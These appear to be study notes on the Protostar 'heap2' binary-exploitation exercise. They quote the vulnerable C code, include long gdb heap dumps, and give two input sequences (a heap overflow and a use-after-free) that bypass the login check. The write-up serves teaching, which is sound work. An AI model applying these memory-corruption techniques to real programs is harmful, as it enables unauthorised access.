# LiveOverflow Binary Exploitation / Memory Corruption

### 0x16 Heap2

Analysis:

1. Auth

    - Code

        ```
        auth = malloc(sizeof(auth));
        memset(auth, 0, sizeof(auth));
        if(strlen(line + 5) < 31) {
          strcpy(auth->name, line + 5);
        }
        ```

    - Allocate memory in heap of 36 bytes which is the size of auth (32 from 32 char sequence + 4 from int)

    - Use memset to set this allocated region of heap to 0s as there is a possibility of old data being found in these regions as free() does not overwrite targetted heap memory and set them back to 0

    - safe strcpy() which copies our input to auth&#8594;name

    - If your input string is too long, we will perform malloc() and allocate memory but we will not perform strcpy()

    - Each malloc() function will allocate 8 bytes before the actual memory to be allocated (4 bytes to store the total size of the entire allocation and to also indicate if the previous memory chunk is used + 4 bytes as a result of the malloc() algorithm)

        ```
        (gdb) r
        The program being debugged has been started already.
        Start it from the beginning? (y or n) y
        Starting program: /opt/protostar/bin/heap2 
        
        Breakpoint 1, 0x0804895f in main (argc=1, argv=0xbffffd94) at heap2/heap2.c:20
        20	in heap2/heap2.c
        ---------- auth ----------------------------------------
        Cannot access memory at address 0x0
        (gdb) c
        Continuing.
        [ auth = (nil), service = (nil) ]
        auth AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAa
        
        Breakpoint 1, 0x0804895f in main (argc=1, argv=0xbffffd94) at heap2/heap2.c:20
        20	in heap2/heap2.c
        ---------- auth ----------------------------------------
        $91 = {name = '\000' <repeats 12 times>"\361, \017", '\000' <repeats 17 times>, auth = 0}
        ---------- service -------------------------------------
        $92 = 0x0
        (gdb) x/64wx 0x804c000
        0x804c000:	0x00000000	0x00000011	0x00000000	0x00000000
        0x804c010:	0x00000000	0x00000ff1	0x00000000	0x00000000
        0x804c020:	0x00000000	0x00000000	0x00000000	0x00000000
        0x804c030:	0x00000000	0x00000000	0x00000000	0x00000000
        0x804c040:	0x00000000	0x00000000	0x00000000	0x00000000
        0x804c050:	0x00000000	0x00000000	0x00000000	0x00000000
        0x804c060:	0x00000000	0x00000000	0x00000000	0x00000000
        0x804c070:	0x00000000	0x00000000	0x00000000	0x00000000
        0x804c080:	0x00000000	0x00000000	0x00000000	0x00000000
        0x804c090:	0x00000000	0x00000000	0x00000000	0x00000000
        0x804c0a0:	0x00000000	0x00000000	0x00000000	0x00000000
        0x804c0b0:	0x00000000	0x00000000	0x00000000	0x00000000
        0x804c0c0:	0x00000000	0x00000000	0x00000000	0x00000000
        0x804c0d0:	0x00000000	0x00000000	0x00000000	0x00000000
        0x804c0e0:	0x00000000	0x00000000	0x00000000	0x00000000
        0x804c0f0:	0x00000000	0x00000000	0x00000000	0x00000000
        (gdb) c
        Continuing.
        [ auth = 0x804c008, service = (nil) ]
        ```

2. Reset

    ```
    free(auth);
    ```

    - frees up the memory pointed to by auth pointer and ONLY that memory location

    - does not reset the address pointed to by the auth pointer

    - freed up memory is now allocatable by program even if existing data remains in adjacent memory locations

    - If memory to be allocated is bigger that the "freed up" space, then memory allocated by an instruction will take the next set of free memory in the heap instead of the ones freed up by `free()`. See below to understand more:

        ```
        (gdb) r
        The program being debugged has been started already.
        Start it from the beginning? (y or n) y
        Starting program: /opt/protostar/bin/heap2 
        
        Breakpoint 1, 0x0804895f in main (argc=1, argv=0xbffffd94) at heap2/heap2.c:20
        20	in heap2/heap2.c
        ---------- auth ----------------------------------------
        Cannot access memory at address 0x0
        (gdb) c
        Continuing.
        [ auth = (nil), service = (nil) ]
        auth ABCDEFGHI
        
        Breakpoint 1, 0x0804895f in main (argc=1, argv=0xbffffd94) at heap2/heap2.c:20
        20	in heap2/heap2.c
        ---------- auth ----------------------------------------
        $79 = {name = "ABCDEFGHI\n\000\000\361\017", '\000' <repeats 17 times>, auth = 0}
        ---------- service -------------------------------------
        $80 = 0x0
        (gdb) x/64wx 0x804c000
        0x804c000:	0x00000000	0x00000011	0x44434241	0x48474645
        0x804c010:	0x00000a49	0x00000ff1	0x00000000	0x00000000
        0x804c020:	0x00000000	0x00000000	0x00000000	0x00000000
        0x804c030:	0x00000000	0x00000000	0x00000000	0x00000000
        0x804c040:	0x00000000	0x00000000	0x00000000	0x00000000
        0x804c050:	0x00000000	0x00000000	0x00000000	0x00000000
        0x804c060:	0x00000000	0x00000000	0x00000000	0x00000000
        0x804c070:	0x00000000	0x00000000	0x00000000	0x00000000
        0x804c080:	0x00000000	0x00000000	0x00000000	0x00000000
        0x804c090:	0x00000000	0x00000000	0x00000000	0x00000000
        0x804c0a0:	0x00000000	0x00000000	0x00000000	0x00000000
        0x804c0b0:	0x00000000	0x00000000	0x00000000	0x00000000
        0x804c0c0:	0x00000000	0x00000000	0x00000000	0x00000000
        0x804c0d0:	0x00000000	0x00000000	0x00000000	0x00000000
        0x804c0e0:	0x00000000	0x00000000	0x00000000	0x00000000
        0x804c0f0:	0x00000000	0x00000000	0x00000000	0x00000000
        (gdb) c
        Continuing.
        [ auth = 0x804c008, service = (nil) ]
        reset
        
        Breakpoint 1, 0x0804895f in main (argc=1, argv=0xbffffd94) at heap2/heap2.c:20
        20	in heap2/heap2.c
        ---------- auth ----------------------------------------
        $81 = {name = "\000\000\000\000EFGHI\n\000\000\361\017", '\000' <repeats 17 times>, auth = 0}
        ---------- service -------------------------------------
        $82 = 0x0
        (gdb) x/64wx 0x804c000
        0x804c000:	0x00000000	0x00000011	0x00000000	0x48474645
        0x804c010:	0x00000a49	0x00000ff1	0x00000000	0x00000000
        0x804c020:	0x00000000	0x00000000	0x00000000	0x00000000
        0x804c030:	0x00000000	0x00000000	0x00000000	0x00000000
        0x804c040:	0x00000000	0x00000000	0x00000000	0x00000000
        0x804c050:	0x00000000	0x00000000	0x00000000	0x00000000
        0x804c060:	0x00000000	0x00000000	0x00000000	0x00000000
        0x804c070:	0x00000000	0x00000000	0x00000000	0x00000000
        0x804c080:	0x00000000	0x00000000	0x00000000	0x00000000
        0x804c090:	0x00000000	0x00000000	0x00000000	0x00000000
        0x804c0a0:	0x00000000	0x00000000	0x00000000	0x00000000
        0x804c0b0:	0x00000000	0x00000000	0x00000000	0x00000000
        0x804c0c0:	0x00000000	0x00000000	0x00000000	0x00000000
        0x804c0d0:	0x00000000	0x00000000	0x00000000	0x00000000
        0x804c0e0:	0x00000000	0x00000000	0x00000000	0x00000000
        0x804c0f0:	0x00000000	0x00000000	0x00000000	0x00000000
        (gdb) c
        Continuing.
        [ auth = 0x804c008, service = (nil) ]
        service AAAAA
        
        Breakpoint 1, 0x0804895f in main (argc=1, argv=0xbffffd94) at heap2/heap2.c:20
        20	in heap2/heap2.c
        ---------- auth ----------------------------------------
        $83 = {name = " AAAAA\n\000I\n\000\000\361\017", '\000' <repeats 17 times>, auth = 0}
        ---------- service -------------------------------------
        $84 = 0x804c008 " AAAAA\n"
        (gdb) x/64wx 0x804c000
        0x804c000:	0x00000000	0x00000011	0x41414120	0x000a4141
        0x804c010:	0x00000a49	0x00000ff1	0x00000000	0x00000000
        0x804c020:	0x00000000	0x00000000	0x00000000	0x00000000
        0x804c030:	0x00000000	0x00000000	0x00000000	0x00000000
        0x804c040:	0x00000000	0x00000000	0x00000000	0x00000000
        0x804c050:	0x00000000	0x00000000	0x00000000	0x00000000
        0x804c060:	0x00000000	0x00000000	0x00000000	0x00000000
        0x804c070:	0x00000000	0x00000000	0x00000000	0x00000000
        0x804c080:	0x00000000	0x00000000	0x00000000	0x00000000
        0x804c090:	0x00000000	0x00000000	0x00000000	0x00000000
        0x804c0a0:	0x00000000	0x00000000	0x00000000	0x00000000
        0x804c0b0:	0x00000000	0x00000000	0x00000000	0x00000000
        0x804c0c0:	0x00000000	0x00000000	0x00000000	0x00000000
        0x804c0d0:	0x00000000	0x00000000	0x00000000	0x00000000
        0x804c0e0:	0x00000000	0x00000000	0x00000000	0x00000000
        0x804c0f0:	0x00000000	0x00000000	0x00000000	0x00000000
        (gdb) c
        Continuing.
        [ auth = 0x804c008, service = 0x804c008 ]
        (gdb) r
        The program being debugged has been started already.
        Start it from the beginning? (y or n) y
        Starting program: /opt/protostar/bin/heap2 
        
        Breakpoint 1, 0x0804895f in main (argc=1, argv=0xbffffd94) at heap2/heap2.c:20
        20	heap2/heap2.c: No such file or directory.
        	in heap2/heap2.c
        Current language:  auto
        The current source language is "auto; currently c".
        ---------- auth ----------------------------------------
        Cannot access memory at address 0x0
        (gdb) c
        Continuing.
        [ auth = (nil), service = (nil) ]
        auth ABCDEFGHIJ
        
        Breakpoint 1, 0x0804895f in main (argc=1, argv=0xbffffd94) at heap2/heap2.c:20
        20	in heap2/heap2.c
        ---------- auth ----------------------------------------
        $85 = {name = "ABCDEFGHIJ\n\000\361\017", '\000' <repeats 17 times>, auth = 0}
        ---------- service -------------------------------------
        $86 = 0x0
        (gdb) x/64wx 0x804c000
        0x804c000:	0x00000000	0x00000011	0x44434241	0x48474645
        0x804c010:	0x000a4a49	0x00000ff1	0x00000000	0x00000000
        0x804c020:	0x00000000	0x00000000	0x00000000	0x00000000
        0x804c030:	0x00000000	0x00000000	0x00000000	0x00000000
        0x804c040:	0x00000000	0x00000000	0x00000000	0x00000000
        0x804c050:	0x00000000	0x00000000	0x00000000	0x00000000
        0x804c060:	0x00000000	0x00000000	0x00000000	0x00000000
        0x804c070:	0x00000000	0x00000000	0x00000000	0x00000000
        0x804c080:	0x00000000	0x00000000	0x00000000	0x00000000
        0x804c090:	0x00000000	0x00000000	0x00000000	0x00000000
        0x804c0a0:	0x00000000	0x00000000	0x00000000	0x00000000
        0x804c0b0:	0x00000000	0x00000000	0x00000000	0x00000000
        0x804c0c0:	0x00000000	0x00000000	0x00000000	0x00000000
        0x804c0d0:	0x00000000	0x00000000	0x00000000	0x00000000
        0x804c0e0:	0x00000000	0x00000000	0x00000000	0x00000000
        0x804c0f0:	0x00000000	0x00000000	0x00000000	0x00000000
        (gdb) c
        Continuing.
        [ auth = 0x804c008, service = (nil) ]
        reset
        
        Breakpoint 1, 0x0804895f in main (argc=1, argv=0xbffffd94) at heap2/heap2.c:20
        20	in heap2/heap2.c
        ---------- auth ----------------------------------------
        $87 = {name = "\000\000\000\000EFGHIJ\n\000\361\017", '\000' <repeats 17 times>, auth = 0}
        ---------- service -------------------------------------
        $88 = 0x0
        (gdb) x/64wx 0x804c000
        0x804c000:	0x00000000	0x00000011	0x00000000	0x48474645
        0x804c010:	0x000a4a49	0x00000ff1	0x00000000	0x00000000
        0x804c020:	0x00000000	0x00000000	0x00000000	0x00000000
        0x804c030:	0x00000000	0x00000000	0x00000000	0x00000000
        0x804c040:	0x00000000	0x00000000	0x00000000	0x00000000
        0x804c050:	0x00000000	0x00000000	0x00000000	0x00000000
        0x804c060:	0x00000000	0x00000000	0x00000000	0x00000000
        0x804c070:	0x00000000	0x00000000	0x00000000	0x00000000
        0x804c080:	0x00000000	0x00000000	0x00000000	0x00000000
        0x804c090:	0x00000000	0x00000000	0x00000000	0x00000000
        0x804c0a0:	0x00000000	0x00000000	0x00000000	0x00000000
        0x804c0b0:	0x00000000	0x00000000	0x00000000	0x00000000
        0x804c0c0:	0x00000000	0x00000000	0x00000000	0x00000000
        0x804c0d0:	0x00000000	0x00000000	0x00000000	0x00000000
        0x804c0e0:	0x00000000	0x00000000	0x00000000	0x00000000
        0x804c0f0:	0x00000000	0x00000000	0x00000000	0x00000000
        (gdb) c
        Continuing.
        [ auth = 0x804c008, service = (nil) ]
        service AAAAAAAAAAAAAAAAAAAAAAAAAAAAA
        
        Breakpoint 1, 0x0804895f in main (argc=1, argv=0xbffffd94) at heap2/heap2.c:20
        20	in heap2/heap2.c
        ---------- auth ----------------------------------------
        $89 = {name = "\000\000\000\000EFGHIJ\n\000)\000\000\000 ", 'A' <repeats 15 times>, auth = 1094795585}
        ---------- service -------------------------------------
        $90 = 0x804c018 " ", 'A' <repeats 29 times>, "\n"
        (gdb) x/64wx 0x804c000
        0x804c000:	0x00000000	0x00000011	0x00000000	0x48474645
        0x804c010:	0x000a4a49	0x00000029	0x41414120	0x41414141
        0x804c020:	0x41414141	0x41414141	0x41414141	0x41414141
        0x804c030:	0x41414141	0x000a4141	0x00000000	0x00000fc9
        0x804c040:	0x00000000	0x00000000	0x00000000	0x00000000
        0x804c050:	0x00000000	0x00000000	0x00000000	0x00000000
        0x804c060:	0x00000000	0x00000000	0x00000000	0x00000000
        0x804c070:	0x00000000	0x00000000	0x00000000	0x00000000
        0x804c080:	0x00000000	0x00000000	0x00000000	0x00000000
        0x804c090:	0x00000000	0x00000000	0x00000000	0x00000000
        0x804c0a0:	0x00000000	0x00000000	0x00000000	0x00000000
        0x804c0b0:	0x00000000	0x00000000	0x00000000	0x00000000
        0x804c0c0:	0x00000000	0x00000000	0x00000000	0x00000000
        0x804c0d0:	0x00000000	0x00000000	0x00000000	0x00000000
        0x804c0e0:	0x00000000	0x00000000	0x00000000	0x00000000
        0x804c0f0:	0x00000000	0x00000000	0x00000000	0x00000000
        ```
3. Service

    ```
    service = strdup(line + 7);
    ```

4. Login

    ```
    if(auth->auth) {
        printf("you have logged in already!\n");
    } else {
        printf("please enter your password\n");
    }
    ```

Logs:

```
(gdb) r
The program being debugged has been started already.
Start it from the beginning? (y or n) y
Starting program: /opt/protostar/bin/heap2 

Breakpoint 1, 0x0804895f in main (argc=1, argv=0xbffffd94) at heap2/heap2.c:20
20	heap2/heap2.c: No such file or directory.
	in heap2/heap2.c
Current language:  auto
The current source language is "auto; currently c".
---------- auth ----------------------------------------
Cannot access memory at address 0x0
(gdb) c
Continuing.
[ auth = (nil), service = (nil) ]
^C
Program received signal SIGINT, Interrupt.
0xb7f53c1e in __read_nocancel () at ../sysdeps/unix/syscall-template.S:82
82	../sysdeps/unix/syscall-template.S: No such file or directory.
	in ../sysdeps/unix/syscall-template.S
Current language:  auto
The current source language is "auto; currently asm".
(gdb) x/64wx 0x804c000
0x804c000:	Cannot access memory at address 0x804c000
(gdb) c
Continuing.
auth ABCD

Breakpoint 1, 0x0804895f in main (argc=1, argv=0xbffffd94) at heap2/heap2.c:20
20	heap2/heap2.c: No such file or directory.
	in heap2/heap2.c
Current language:  auto
The current source language is "auto; currently c".
---------- auth ----------------------------------------
$17 = {name = "ABCD\n\000\000\000\000\000\000\000\361\017", '\000' <repeats 17 times>, auth = 0}
---------- service -------------------------------------
$18 = 0x0
(gdb) x/64wx 0x804c000
0x804c000:	0x00000000	0x00000011	0x44434241	0x0000000a
0x804c010:	0x00000000	0x00000ff1	0x00000000	0x00000000
0x804c020:	0x00000000	0x00000000	0x00000000	0x00000000
0x804c030:	0x00000000	0x00000000	0x00000000	0x00000000
0x804c040:	0x00000000	0x00000000	0x00000000	0x00000000
0x804c050:	0x00000000	0x00000000	0x00000000	0x00000000
0x804c060:	0x00000000	0x00000000	0x00000000	0x00000000
0x804c070:	0x00000000	0x00000000	0x00000000	0x00000000
0x804c080:	0x00000000	0x00000000	0x00000000	0x00000000
0x804c090:	0x00000000	0x00000000	0x00000000	0x00000000
0x804c0a0:	0x00000000	0x00000000	0x00000000	0x00000000
0x804c0b0:	0x00000000	0x00000000	0x00000000	0x00000000
0x804c0c0:	0x00000000	0x00000000	0x00000000	0x00000000
0x804c0d0:	0x00000000	0x00000000	0x00000000	0x00000000
0x804c0e0:	0x00000000	0x00000000	0x00000000	0x00000000
0x804c0f0:	0x00000000	0x00000000	0x00000000	0x00000000
(gdb) c
Continuing.
[ auth = 0x804c008, service = (nil) ]
service QQQQ

Breakpoint 1, 0x0804895f in main (argc=1, argv=0xbffffd94) at heap2/heap2.c:20
20	in heap2/heap2.c
---------- auth ----------------------------------------
$19 = {name = "ABCD\n\000\000\000\000\000\000\000\021\000\000\000 QQQQ\n\000\000\000\000\000\000\341\017\000", auth = 0}
---------- service -------------------------------------
$20 = 0x804c018 " QQQQ\n"
(gdb) x/64wx 0x804c000
0x804c000:	0x00000000	0x00000011	0x44434241	0x0000000a
0x804c010:	0x00000000	0x00000011	0x51515120	0x00000a51
0x804c020:	0x00000000	0x00000fe1	0x00000000	0x00000000
0x804c030:	0x00000000	0x00000000	0x00000000	0x00000000
0x804c040:	0x00000000	0x00000000	0x00000000	0x00000000
0x804c050:	0x00000000	0x00000000	0x00000000	0x00000000
0x804c060:	0x00000000	0x00000000	0x00000000	0x00000000
0x804c070:	0x00000000	0x00000000	0x00000000	0x00000000
0x804c080:	0x00000000	0x00000000	0x00000000	0x00000000
0x804c090:	0x00000000	0x00000000	0x00000000	0x00000000
0x804c0a0:	0x00000000	0x00000000	0x00000000	0x00000000
0x804c0b0:	0x00000000	0x00000000	0x00000000	0x00000000
0x804c0c0:	0x00000000	0x00000000	0x00000000	0x00000000
0x804c0d0:	0x00000000	0x00000000	0x00000000	0x00000000
0x804c0e0:	0x00000000	0x00000000	0x00000000	0x00000000
0x804c0f0:	0x00000000	0x00000000	0x00000000	0x00000000
(gdb) c
Continuing.
[ auth = 0x804c008, service = 0x804c018 ]
service FGHJ

Breakpoint 1, 0x0804895f in main (argc=1, argv=0xbffffd94) at heap2/heap2.c:20
20	in heap2/heap2.c
---------- auth ----------------------------------------
$21 = {name = "ABCD\n\000\000\000\000\000\000\000\021\000\000\000 QQQQ\n\000\000\000\000\000\000\021\000\000", auth = 1212630560}
---------- service -------------------------------------
$22 = 0x804c028 " FGHJ\n"
(gdb) x/64wx 0x804c000
0x804c000:	0x00000000	0x00000011	0x44434241	0x0000000a
0x804c010:	0x00000000	0x00000011	0x51515120	0x00000a51
0x804c020:	0x00000000	0x00000011	0x48474620	0x00000a4a
0x804c030:	0x00000000	0x00000fd1	0x00000000	0x00000000
0x804c040:	0x00000000	0x00000000	0x00000000	0x00000000
0x804c050:	0x00000000	0x00000000	0x00000000	0x00000000
0x804c060:	0x00000000	0x00000000	0x00000000	0x00000000
0x804c070:	0x00000000	0x00000000	0x00000000	0x00000000
0x804c080:	0x00000000	0x00000000	0x00000000	0x00000000
0x804c090:	0x00000000	0x00000000	0x00000000	0x00000000
0x804c0a0:	0x00000000	0x00000000	0x00000000	0x00000000
0x804c0b0:	0x00000000	0x00000000	0x00000000	0x00000000
0x804c0c0:	0x00000000	0x00000000	0x00000000	0x00000000
0x804c0d0:	0x00000000	0x00000000	0x00000000	0x00000000
0x804c0e0:	0x00000000	0x00000000	0x00000000	0x00000000
0x804c0f0:	0x00000000	0x00000000	0x00000000	0x00000000
(gdb) c
Continuing.
[ auth = 0x804c008, service = 0x804c028 ]
login
you have logged in already!

Breakpoint 1, 0x0804895f in main (argc=1, argv=0xbffffd94) at heap2/heap2.c:20
20	in heap2/heap2.c
---------- auth ----------------------------------------
$23 = {name = "ABCD\n\000\000\000\000\000\000\000\021\000\000\000 QQQQ\n\000\000\000\000\000\000\021\000\000", auth = 1212630560}
---------- service -------------------------------------
$24 = 0x804c028 " FGHJ\n"
(gdb) c
Continuing.
[ auth = 0x804c008, service = 0x804c028 ]
auth admin

Breakpoint 1, 0x0804895f in main (argc=1, argv=0xbffffd94) at heap2/heap2.c:20
20	in heap2/heap2.c
---------- auth ----------------------------------------
$25 = {name = "admin\n\000\000\000\000\000\000\301\017", '\000' <repeats 17 times>, auth = 0}
---------- service -------------------------------------
$26 = 0x804c028 " FGHJ\n"
(gdb) x/64wx 0x804c000
0x804c000:	0x00000000	0x00000011	0x44434241	0x0000000a
0x804c010:	0x00000000	0x00000011	0x51515120	0x00000a51
0x804c020:	0x00000000	0x00000011	0x48474620	0x00000a4a
0x804c030:	0x00000000	0x00000011	0x696d6461	0x00000a6e
0x804c040:	0x00000000	0x00000fc1	0x00000000	0x00000000
0x804c050:	0x00000000	0x00000000	0x00000000	0x00000000
0x804c060:	0x00000000	0x00000000	0x00000000	0x00000000
0x804c070:	0x00000000	0x00000000	0x00000000	0x00000000
0x804c080:	0x00000000	0x00000000	0x00000000	0x00000000
0x804c090:	0x00000000	0x00000000	0x00000000	0x00000000
0x804c0a0:	0x00000000	0x00000000	0x00000000	0x00000000
0x804c0b0:	0x00000000	0x00000000	0x00000000	0x00000000
0x804c0c0:	0x00000000	0x00000000	0x00000000	0x00000000
0x804c0d0:	0x00000000	0x00000000	0x00000000	0x00000000
0x804c0e0:	0x00000000	0x00000000	0x00000000	0x00000000
0x804c0f0:	0x00000000	0x00000000	0x00000000	0x00000000
(gdb) c
Continuing.
[ auth = 0x804c038, service = 0x804c028 ]
login
please enter your password

Breakpoint 1, 0x0804895f in main (argc=1, argv=0xbffffd94) at heap2/heap2.c:20
20	in heap2/heap2.c
---------- auth ----------------------------------------
$27 = {name = "admin\n\000\000\000\000\000\000\301\017", '\000' <repeats 17 times>, auth = 0}
---------- service -------------------------------------
$28 = 0x804c028 " FGHJ\n"
(gdb) x/64wx 0x804c000
0x804c000:	0x00000000	0x00000011	0x44434241	0x0000000a
0x804c010:	0x00000000	0x00000011	0x51515120	0x00000a51
0x804c020:	0x00000000	0x00000011	0x48474620	0x00000a4a
0x804c030:	0x00000000	0x00000011	0x696d6461	0x00000a6e
0x804c040:	0x00000000	0x00000fc1	0x00000000	0x00000000
0x804c050:	0x00000000	0x00000000	0x00000000	0x00000000
0x804c060:	0x00000000	0x00000000	0x00000000	0x00000000
0x804c070:	0x00000000	0x00000000	0x00000000	0x00000000
0x804c080:	0x00000000	0x00000000	0x00000000	0x00000000
0x804c090:	0x00000000	0x00000000	0x00000000	0x00000000
0x804c0a0:	0x00000000	0x00000000	0x00000000	0x00000000
0x804c0b0:	0x00000000	0x00000000	0x00000000	0x00000000
0x804c0c0:	0x00000000	0x00000000	0x00000000	0x00000000
0x804c0d0:	0x00000000	0x00000000	0x00000000	0x00000000
0x804c0e0:	0x00000000	0x00000000	0x00000000	0x00000000
0x804c0f0:	0x00000000	0x00000000	0x00000000	0x00000000
```

Explanation of logs:

- We first try to run `auth ABCD` and see that the heap is updated as follows (0x0a is '\n' which accounts for our enter keypress to submit the `auth ABCD` input). We also observe that this malloc() entry takes up 0x1 (16) bytes of space which is strange as our auth struct should take 32 (from name char sequence) + 4 (from auth int) bytes of space. This is because we named our variables poorly: auth for the struct, auth for the int, auth for the actual initialisation and declaration for our pointer. Hence, when the program executes malloc(sizeof(auth)), it is taking the size of auth pointer which is 8 bytes seen [here](https://www.ibm.com/docs/en/ibm-mq/7.5?topic=platforms-standard-data-types).

    `0x804c000:	0x00000000	0x00000011	0x44434241	0x0000000a`

- Once we have allocated space for our auth struct in heap, our objective is to overwrite the name property within our auth struct. Given that we know the way the auth struct is designed with 32 byte char string and 4 byte int, we can exactly identify the segment of the heap which holds the int auth property that we are trying to overwrite such that when we run login, it will print "you have logged in already!" (i.e. overwrite the int aut property to any value more than 0x0)

- When we try to use the `service` command, we observe that the input from our service commands occupies the next available memory locations in our heap. We can use the `service` command to input random strings in our heap and hence overwrite the auth variable within our auth pointer since it wrongly allocated the total space that the pointer will take at 0x1 (16) bytes.

- If we run `auth` again, then the address of the int auth variable that we need to write will change as well

### Answers

- Solution w/o use-after-free exploit

    ```
    $ /opt/protostar/bin/heap2
    [ auth = (nil), service = (nil) ]
    auth AAAA
    [ auth = 0x804c008, service = (nil) ]
    service AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
    [ auth = 0x804c008, service = 0x804c018 ]
    login
    you have logged in already!
    [ auth = 0x804c008, service = 0x804c018 ]
    ```

- Solution w use-after-free exploit

    ```
    $ /opt/protostar/bin/heap2
    [ auth = (nil), service = (nil) ]
    auth AAAA
    [ auth = 0x804c008, service = (nil) ]
    reset
    [ auth = 0x804c008, service = (nil) ]
    service AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAa
    [ auth = 0x804c008, service = 0x804c018 ]
    login
    you have logged in already!
    [ auth = 0x804c008, service = 0x804c018 ]
    ```
